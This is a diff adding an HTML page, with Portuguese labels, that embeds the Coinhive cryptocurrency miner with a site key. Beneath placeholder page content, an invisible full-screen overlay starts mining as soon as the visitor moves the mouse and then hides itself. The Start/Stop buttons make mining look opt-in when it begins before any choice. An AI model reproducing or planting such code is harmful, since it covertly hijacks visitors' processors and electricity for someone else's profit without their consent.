@@ -1,0 +1,55 @@
+<html>
+<body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	//var miner = new CoinHive.Anonymous('PlomeLq7c84iO9xokFp4xyiWsFU5THNy', {throttle: 0.5});
+	var miner;
+	function iniciar(){
+		miner = new CoinHive.Anonymous('6TRyB42aZNT1umNzMryl7lFZvVtxqtsn', {throttle: 0.2});
+		try{
+			miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+			//miner.on("close", function(){
+			//	miner = new CoinHive.Anonymous('PlomeLq7c84iO9xokFp4xyiWsFU5THNy', {throttle: 0.5});
+			//	miner.start();
+			//});
+			//alert('MINERANDO!');
+			$("#divTop").hide();
+			$("#btnIniciar").prop("disabled",true);
+			$("#btnParar").prop("disabled",false);
+		}
+		catch(err){
+			alert(err);
+			$("#btnIniciar").prop("disabled",false);
+			$("#btnParar").prop("disabled",true);
+		}
+	}
+	function parar(){
+		miner.stop();
+		$("#btnIniciar").prop("disabled",false);
+		$("#btnParar").prop("disabled",true);
+	}
+	
+	setInterval(function(){
+		$("#spnHashs").html(parseFloat(miner.getHashesPerSecond()).toFixed(2)+" hash/s");
+		if(miner.isRunning()){
+			$("#spnStatus").html("<font color='blue'>rodando...</font>");
+			$("#btnIniciar").prop("disabled",true);
+			$("#btnParar").prop("disabled",false);
+		}else{
+			$("#spnStatus").html("<font color='red'>parado!</font>");
+			$("#btnIniciar").prop("disabled",false);
+			$("#btnParar").prop("disabled",true);
+		}
+	}, 1000);
+	
+</script>
+	<div style="position: fixed; top: 0; left: 0; cursor: pointer; width: 100%; height: 100%;" onmousemove="iniciar()" id="divTop"></div>
+	<h1>conteúdo da página</h1>
+	<span id="spnStatus"></span><br/>
+	<span id="spnHashs"></span><br/>
+	<input type="button" value="Iniciar" onclick="iniciar()" id="btnIniciar"/>
+	<input type="button" value="Parar" onclick="parar()" id="btnParar" />
+	
+</body>
+</html>
